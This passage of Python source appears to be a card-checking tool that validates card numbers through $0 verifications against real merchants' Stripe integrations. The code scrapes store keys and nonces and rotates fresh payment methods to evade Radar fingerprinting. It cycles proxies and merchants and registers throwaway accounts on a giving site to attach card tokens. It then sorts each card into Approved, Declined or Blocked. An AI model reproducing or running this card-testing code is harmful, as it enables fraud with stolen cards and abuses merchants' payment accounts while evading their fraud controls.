    if not pk:
        raise IntegrationError("no Stripe publishable key on the store")
    if not nonce:
        raise IntegrationError("no createAndConfirmSetupIntentNonce on the store")

    # 2. Stripe's account-range table for this BIN.  An empty table means
    #    Stripe does not know the BIN, so the card cannot exist.  This runs
    #    AFTER tokenization so a known Stripe test card is reported as
    #    such rather than as an unknown BIN -- and it runs CONCURRENTLY
    #    with the tokenization, because neither needs the other's result.
    meta_holder = {}

    async def _meta_runner():
        # The result is collected in a holder so the task can never end
        # with an unretrieved exception.
        try:
            meta_holder["value"] = await _card_metadata(client, pk, cc, budget, max_wait)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            meta_holder["error"] = e

    meta_task = asyncio.create_task(_meta_runner())
    ranges = None
    meta = {}

    # 3/4. tokenize + let the store confirm the setup intent.
    #    Every attempt uses a FRESH payment method: a payment method
    #    cannot be reused across intents, and a fresh one also gives
    #    Radar a fresh device fingerprint to score.
    #
    #    The setup intent is the authoritative probe (the $0
    #    verification).  When it refuses without naming a reason, a
    #    payment intent is created as well -- it carries Stripe's
    #    decline_code, which says whether the issuer answered at all.
    last_detail = None
    store_error = False
    routes = _si_routes(host, wp_ajax_url, ajax_url)
    route_idx = 0
    refreshed = False

    async def _refresh_store_values():
        """Drop the cached key/nonce and fetch them again.  Returns True on
        success."""
        _drop_store_params(host)
        try:
            sp2 = await _fetch_store_params(client, host, budget, max_wait)
        except Exception:
            return False
        if not (sp2.get("key") and sp2.get("nonce")):
            return False
        nonlocal pk, nonce, wp_ajax_url, ajax_url, routes, route_idx
        pk = sp2["key"]
        nonce = sp2["nonce"]
        wp_ajax_url = sp2.get("wp_ajax_url", "")
        ajax_url = sp2.get("ajax_url", "")
        routes = _si_routes(host, wp_ajax_url, ajax_url)
        route_idx = 0
        return True

    for attempt in range(5):
        if budget.expired():
            break

        pm_id, pm_err = await _create_payment_method(
            client, pk, cc, mm, yy, cvv,
            store.get("country"), store.get("state"), store.get("city"), store.get("zip"),
            budget, max_wait,
        )
        if pm_id is None:
            if not meta_task.done():
                meta_task.cancel()
            await asyncio.gather(meta_task, return_exceptions=True)
            verdict, detail = _verdict_from_pm_error(pm_err)
            if verdict == "Error" and "test card" not in detail:
                raise IntegrationError(detail)
            return verdict, detail

        if ranges is None:
            await meta_task
            if "error" in meta_holder:
                # the BIN lookup ran into the proxy -> same handling as
                # any other proxy problem
                raise meta_holder["error"]
            ranges, meta = meta_holder.get("value", (None, {}))

        if ranges == []:
            return "Declined", "Your card number is incorrect. (unknown BIN)"

        try:
            verdict, detail, _ = await _setup_intent(
                client, host, nonce, pm_id, budget, routes[route_idx], max_wait
            )
        except IntegrationError as e:
            # The store refused to answer.
            last_detail = str(e)[:90]
            store_error = True
            if "non-JSON" in last_detail or "not callable" in last_detail:
                # The store dropped the request (an empty 200).  The next
                # attempt opens a fresh connection, which usually lands on
                # a backend that answers -- so retry quickly instead of
                # sleeping away the worker's time.
                await asyncio.sleep(0.8)
                continue
            # A non-JSON reply can also mean the nonce is no longer
            # accepted, so the cached values are dropped and fetched again.
            if from_cache and not refreshed:
                refreshed = True
                from_cache = False
                if await _refresh_store_values():
                    continue
            route_idx = (route_idx + 1) % len(routes)
            await asyncio.sleep(1.0)
            continue

        if verdict != "ERROR":
            return verdict, detail

        # The store refused.  A stale nonce is not a verdict about the
        # card -- the store could not even check it -- so the cached key
        # and nonce are fetched again and the card is retried.
        if from_cache and not refreshed and _is_nonce_error(detail):
            refreshed = True
            from_cache = False
            if await _refresh_store_values():
                continue

        # The store refused.  A specific reason is a verdict about the
        # card; a generic one is not.
        low = detail.lower()
        if "card number is incorrect" in low:
            return "Declined", "Your card number is incorrect. (incorrect_number)"
        if "expiration month is invalid" in low:
            return "Declined", "Your card's expiration month is invalid. (invalid_expiry_month)"
        if "expiration year is invalid" in low:
            return "Declined", "Your card's expiration year is invalid. (invalid_expiry_year)"
        if "has expired" in low or "is expired" in low:
            return "Declined", "Your card has expired. (expired_card)"
        if "security code is incorrect" in low:
            return "Declined", "Your card's security code is incorrect. (incorrect_cvc)"

        low = detail.lower()
        if "cannot be attached" in low or "attach it to a customer" in low:
            # The payment method was already used by a previous attempt.
            # Make a fresh one and try again.
            last_detail = detail
            await asyncio.sleep(0.8)
            continue

        # The merchant's own Stripe account asked the issuer to verify the
        # card and the issuer said no without naming a reason ("Your card
        # was declined.").  That is a refusal, so it is a decline: it
        # does not prove the card works, but it is not a broken check
        # either.  Before, this was left undecided and the next merchant
        # was asked -- and when that one was down, the card came back as
        # an error even though this merchant HAD answered.
        if "declined" in low or "decline" in low:
            return "Declined", "Your card was declined. (generic_decline)"

        last_detail = detail
        break

    # The merchant refused but gave no usable reason, or Radar blocked
    # the request.  Not conclusive: report it as blocked so the caller
    # tries the other probe.
    if not meta_task.done():
        meta_task.cancel()
    await asyncio.gather(meta_task, return_exceptions=True)
    if store_error and last_detail:
        # The store never answered (throttled, hiccupped, wrong route).
        # The card was never checked, so this is NOT a decline.
        return "Error", last_detail
    return "Blocked", last_detail or "Your card was refused by the issuer."


async def _attach_probe(client, cc, mm, yy, cvv, budget):
    """The pk-only $0 check, exactly as the reference script does it.

    No checkout, no cart, no product -- just the publishable key:

        1. POST /v1/tokens with the pk         -> a card token
        2. the merchant's attach endpoint       -> THE ISSUER ANSWERS

    Step 1 on its own is only a format check: measured, 17 of 20
    Luhn-valid numbers under real BINs also got a token.  But its ERRORS
    are definitive (expired card, unknown number, test card), so it is
    used as a cheap pre-check.

    Step 2 is where the bank is asked to verify the card, and the answer
    is binary: success = the card is good, failure = it is not.  The
    failure text is generic ("...may already be associated with an
    account...") so the reason is not recoverable, but the verdict is.

    Returns (verdict, reason) or (None, None).
    """
    import base64 as _b64
    import urllib.parse as _up

    # --- 1. the token, with the publishable key only
    tok = None
    try:
        r = await client.post(
            f"{STRIPE_API}/tokens",
            data={
                "card[number]": cc, "card[cvc]": cvv,
                "card[exp_month]": mm, "card[exp_year]": yy,
                "card[address_zip]": "03867",
                "key": LEGACY_TOKEN_PK,
                "payment_user_agent": ("stripe.js/c21825cd1c; stripe-js-v3/c21825cd1c; "
                                       "card-element"),
                "pasted_fields": "number",
                "client_attribution_metadata[client_session_id]": _guid(36),
                "client_attribution_metadata[merchant_integration_source]": "elements",
                "client_attribution_metadata[merchant_integration_subtype]": "card-element",
                "client_attribution_metadata[merchant_integration_version]": "2017",
                "client_attribution_metadata[wallet_config_id]": _guid(36),
            },
            headers={
                "User-Agent": UA,
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
            },
            timeout=budget.slice(20),
        )
        body = r.json()
    except Exception:
        return None, None

    if "error" in body:
        err = body["error"]
        code = (err.get("code") or "").lower()
        decline = (err.get("decline_code") or "").lower()
        message = str(err.get("message", ""))[:120]
        if "unsupported" in message.lower() or "integration surface" in message.lower():
            return None, None
        if code == "live_mode_test_card" or decline == "live_mode_test_card":
            return "Error", "That is a Stripe test card, not a real card. (live_mode_test_card)"
        if code in ("incorrect_number", "invalid_number"):
            return "Declined", "Your card number is incorrect. (incorrect_number)"
        if code == "invalid_expiry_year":
            return "Declined", "Your card has expired. (invalid_expiry_year)"
        if code == "invalid_expiry_month":
            return "Declined", "Your card's expiration month is invalid. (invalid_expiry_month)"
        if code in BROKEN_CODES or decline in BROKEN_CODES:
            return None, None
        return None, None
    tok = body.get("id")
    if not tok:
        return None, None

    # --- 2. the merchant attaches it; the bank verifies the card.
    #     The merchant needs a real session: register, then quick-login
    #     with the PIN, then attach the token.
    brand, card_type = _brand_of(cc)
    email = f"probe{_guid(8)}@gmail.com"
    pin = "".join(random.choices("0123456789", k=4))
    session_key = None
    try:
        r = await client.get(
            f"{ATTACH_API}/api/register",
            params={
                "email": email, "password": "MIHIGH72A!",
                "first_name": "abc", "last_name": "defg",
                "pin": pin, "source": "simpletithe_browser",
            },
            headers={
                "User-Agent": UA,
                "Accept": "application/json, text/plain, */*",
                "Origin": ATTACH_API,
                "Referer": f"{ATTACH_API}/give_new/www/",
            },
            timeout=budget.slice(20),
        )
        j = r.json()
        if j.get("status") == "success":
            session_key = j.get("login_session_key")
    except Exception:
        session_key = None
    if not session_key:
        return None, None

    try:
        await client.post(
            f"{ATTACH_API}/api/quick-login",
            json={"user": email, "login_session_key": session_key, "pin": pin},
            headers={
                "User-Agent": UA,
                "Accept": "application/json, text/plain, */*",
                "Origin": ATTACH_API,
                "Referer": f"{ATTACH_API}/give_new/www/",
            },
            timeout=budget.slice(15),
        )
    except Exception:
        pass

    try:
        r = await client.post(
            f"{ATTACH_API}/api/update-payment-method-token",
            headers={
                "User-Agent": UA,
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": ATTACH_API,
                "Referer": f"{ATTACH_API}/give_new/www/",
            },
            data={
                "user": email,
                "login_session_key": session_key,
                "pin": pin,
                "token": tok,
                "last_four": cc[-4:],
                "card_type": card_type,
                "payment_method_type": "card",
                "brand": brand,
            },
            timeout=budget.slice(20),
        )
        j = r.json()
    except Exception:
        return None, None

    if j.get("status") == "success":
        return "Approved", "Your card was verified. (issuer accepted the card)"

    # The attach refused.  That is NOT conclusive on its own: the same
    # answer comes back for a card that is already attached to a customer
    # on that account, which is what happens to widely-shared test
    # cards.  So report it as "no verdict" and let the WooCommerce
    # merchant -- a different Stripe account -- decide.
    return None, None


def _brand_of(cc):
    if cc.startswith("4"):
        return "visa", "visa"
    if cc.startswith("5"):
        return "mastercard", "mastercard"
    if cc.startswith("3"):
        return "amex", "amex"
    if cc.startswith("6"):
        return "discover", "discover"
    return "unknown", "unknown"


async def woocommerce_stripe_check(cc, mm, yy, cvv, proxy=None, user_id=None,
                                   budget_sec=180, proxy_tries=2,
                                   force_proxy=False):
    """$0 auth against a real merchant's Stripe integration."""
    start = time.time()

    cc = re.sub(r"\D", "", str(cc or ""))
    if len(yy) == 2:
        yy = f"20{yy}"
    mm = mm.zfill(2)

    # Local checks first: a bogus number or an expired date is dead, and
    # neither needs a network round trip.
    if not _luhn_ok(cc):
        return f"Declined - Your card number is incorrect. (fails Luhn) " \
               f"[{round(time.time() - start, 2)}s]"
    if _is_expired(mm, yy):
        return f"Declined - Your card has expired. (expiry {mm}/{yy} is in the past) " \
               f"[{round(time.time() - start, 2)}s]"

    budget = Budget(budget_sec)
    headers = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    client_kwargs = {
        "timeout": httpx.Timeout(45.0),
        "max_redirects": 10,
        "headers": headers,
        "follow_redirects": True,
    }
    # A direct check is faster than one through a proxy: the store's page
    # and nonce are cached for it, while every request through a proxy
    # pays the extra hop (measured 2.5-3.5 s direct against 5-7 s
    # proxied).  The merchant does not block by IP, so the check goes
    # direct and the proxy is only the rescue for when the direct route
    # cannot reach the store at all.
    if proxy and force_proxy:
        client_kwargs["proxy"] = proxy

    last_error = None
    blocked = None
    reached_store = False
    try:
        async with httpx.AsyncClient(**client_kwargs) as client:
            # 1. the WooCommerce merchant, on its own Stripe account.
            for store in WC_STORES:
                if budget.expired():
                    break
                # each store gets its own slice of the budget so a slow
                # first store cannot starve the second.  The second
                # merchant is a backup: it gets less time, because the
                # first one usually answers.
                slice_sec = 90 if store is WC_STORES[0] else 45
                store_budget = Budget(min(budget.remaining(), slice_sec))
                try:
                    verdict, detail = await _run_store(
                        client, store, cc, mm, yy, cvv, store_budget,
                        PROXY_MAX_WAIT if proxy else None,
                    )
                    reached_store = True
                    elapsed = round(time.time() - start, 2)

                    # A definitive answer about the card: stop here.
                    if verdict in ("Approved", "Declined"):
                        _note_working_proxy(proxy)
                        _score_proxy(proxy, elapsed <= _PROXY_GOOD_SEC)
                        return f"{verdict} - {detail} [{elapsed}s]"

                    # This merchant could not check the card at all (it
                    # was down, throttled, or answered with something
                    # that is not JSON).  That says nothing about the
                    # card, so it must not overrule what another merchant
                    # already said -- keep it and try the next one.
                    if verdict == "Error":
                        last_error = last_error or str(detail)[:100]
                        continue

                    # This merchant's Radar rules blocked the request, or
                    # it refused without naming a reason.  Another
                    # merchant runs on a different Stripe account with
                    # different rules, so keep the result and try the
                    # next one.
                    blocked = detail
                    continue
                except ProxyTimeout as e:
                    # The proxy works, but it drags.  Every other store
                    # would be just as slow, so stop and let the caller
                    # redo the check directly.  The proxy is kept -- it
                    # may still be fine for something else -- but it is
                    # scored down so the next card skips it.
                    _score_proxy(proxy, False)
                    last_error = f"proxy too slow ({type(e).__name__})"
                    break
                except ProxyUnreachable as e:
                    # The connection is dead.  Every other store would fail
                    # the same way through the same proxy, so stop and let
                    # the caller retry direct.
                    _score_proxy(proxy, False)
                    last_error = f"proxy timed out ({type(e).__name__})"
                    _drop_dead_proxy(user_id, proxy)
                    break
                except IntegrationError as e:
                    last_error = str(e)[:100]
                    continue
                except Exception as e:
                    last_error = f"{type(e).__name__}: {type(e).__name__}: {str(e)[:70]}"
                    continue

            # 1b. not one store was reached.  The card is not the problem,
            #     the route is.  The proxy is the rescue for when the
            #     direct connection cannot reach the merchant, so try it
            #     NOW, before spending the rest of the budget on the
            #     pk-only probe.
            if not reached_store and proxy and not force_proxy:
                logger.info("BT/ST: the direct route failed, retrying through the proxy")
                again = await woocommerce_stripe_check(
                    cc, mm, yy, cvv, proxy=proxy, user_id=user_id,
                    budget_sec=min(60, budget_sec),
                    proxy_tries=0, force_proxy=True)
                if not again.startswith("Error - proxy"):
                    return again
                last_error = last_error or again

            # 2. the pk-only $0 check: no checkout, no cart, no product.
            #    It is on a different Stripe account, so its Radar rules
            #    are independent and it can still answer when the
            #    WooCommerce merchant could not.  A success here is a
            #    definitive Approved -- the issuer verified the card.
            pk_verdict, pk_detail = await _attach_probe(
                client, cc, mm, yy, cvv, budget)
            if pk_verdict in ("Approved", "Declined", "Error"):
                return f"{pk_verdict} - {pk_detail} " \
                       f"[{round(time.time() - start, 2)}s]"

            elapsed = round(time.time() - start, 2)

            # Every merchant blocked the request before the issuer could
            # answer.  The card was refused, so report it as declined.
            if blocked:
                return f"Declined - {blocked} [{elapsed}s]"

            if last_error:
                return f"Error - {last_error} [{elapsed}s]"
            return f"Error - No merchant reachable [{elapsed}s]"

    except httpx.TimeoutException:
        return f"Error - Timeout [{round(time.time() - start, 2)}s]"
    except Exception as e:
        return f"Error - {type(e).__name__}: {str(e)[:100]} [{round(time.time() - start, 2)}s]"
